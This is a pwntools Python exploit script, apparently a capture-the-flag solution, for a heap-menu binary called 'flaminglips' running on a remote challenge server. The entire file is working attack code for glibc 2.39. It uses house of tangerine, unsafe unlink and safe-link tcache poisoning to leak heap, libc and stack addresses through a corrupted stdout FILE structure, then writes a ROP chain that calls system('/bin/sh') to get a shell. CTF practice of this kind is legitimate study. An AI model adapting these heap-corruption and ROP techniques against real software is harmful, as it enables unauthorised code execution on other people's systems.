#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './flaminglips')

if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def new(idx, size, payload):
    io.sendlineafter(b'5. Exit\n> ', b'1')
    io.sendlineafter(b'index?\n> ', str(idx).encode())
    io.sendlineafter(b'big?\n> ', str(size).encode())
    io.sendlineafter(b'payload?\n> ', payload)

def delete(idx):
    io.sendlineafter(b'5. Exit\n> ', b'2')
    io.sendlineafter(b'index?\n> ', str(idx).encode())

def edit(idx, payload):
    io.sendlineafter(b'5. Exit\n> ', b'3')
    io.sendlineafter(b'index?\n> ', str(idx).encode())
    io.sendlineafter(b'contents?\n> ', payload)

def view(idx):
    io.sendlineafter(b'5. Exit\n> ', b'4')
    io.sendlineafter(b'index?\n> ', str(idx).encode())

def safe_link(addr, key):
        return addr ^ (key >> 12)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

# io = start()
io = remote('0.cloud.chals.io', 24302)

io.recvuntil(b'Heap leak: ')
heap_leak = int(io.recvline(), 16)
heap_base = heap_leak - 0x2a0
log.success(f"{heap_leak = :#x}")

# bypass free limitation using house of tangerine (overwite top chunk size)
# https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c
new(0, 0xce0, b'toto')
edit(0, b'A'*0xce0+p64(0)+p64(0x61))
new(1, 0xf90, b'titi')
edit(1, b'A'*0xf90+p64(0)+p64(0x61))
new(2, 0xf90, b'tutu')
edit(2, b'A'*0xf90+p64(0)+p64(0x61))
new(8, 0xf90, b'tutu')
# Now we have a tcache freelist in our chunks

# get leak using unlink
# https://github.com/shellphish/how2heap/blob/master/glibc_2.35/unsafe_unlink.c
new(3, 0x50, b'toto')
new(4, 0x50, b'toto')
new(5, 0x500, b'toto')
new(6, 0x10, b'anti-conso')
edit(3, p64(0) + p64(0x50+0x60) + p64(heap_leak+0x65d10)*2 )
edit(4, b'A'*0x50 + p64(0x50+0x60) + p64(0x510))
delete(5)

new(7, 0x40, b'')
view(4)
libc_leak = u64(io.recvline()[:-1].ljust(8, b'\0'))
libc.address = libc_leak - (libc.sym.main_arena + 96)
log.info(f"{libc.address = :#x}")


# Overwrite the tcache freelist
p = flat({
    0xfa0: safe_link(heap_base+0x90, heap_leak+0x43d10)
})
edit(2, p)

new(9, 0x30, b'toto')
new(10, 0x30, p64(0)*2 + p64(heap_base+0x10))
new(11, 0x30, p16(0)*2 + p16(0x100))

# Now arr[10] and arr[11] points into tcache_perthread_struct
# https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L3118
# So we can fully control tcache freelist

# leak stack using environ
edit(10, p64(0)*2 + p64(libc.sym['_IO_2_1_stdout_']))
FILE = flat(
    p64(0xfbad1800),#magic
  p64(0)*3,         #read
  libc.sym.environ,
  libc.sym.environ+8,

)
new(12, 0x30, FILE)
stack_leak = u64(io.recv(8))
log.success(f'{stack_leak = :#x}')
io.recvuntil(b'> ')
io.sendlineafter(b'> ', b'200')
io.sendlineafter(b'> ', b'200')

# Write rop to stack
edit(10, p64(0)*2 + p64(stack_leak-0x160-8))
rop = ROP(libc)
rop.raw(rop.ret.address)
rop.system(next(libc.search(b'/bin/sh')))
new(13, 0x30, p64(0xc0febabe)+rop.chain())


io.interactive()

